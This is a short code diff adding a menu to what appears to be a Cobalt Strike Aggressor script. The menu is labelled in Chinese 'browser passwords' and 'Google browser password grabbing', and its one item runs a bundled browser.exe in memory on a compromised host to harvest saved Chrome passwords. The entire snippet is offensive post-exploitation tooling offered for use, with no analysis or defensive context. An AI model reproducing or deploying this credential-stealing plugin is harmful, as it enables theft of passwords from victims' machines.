@@ -1,0 +1,4 @@
+    menu "浏览器密码" {
+            item "Google浏览器密码抓取" {
+            bexecute_assembly($1, script_resource("/scripts/browser/browser.exe"));}
+            }
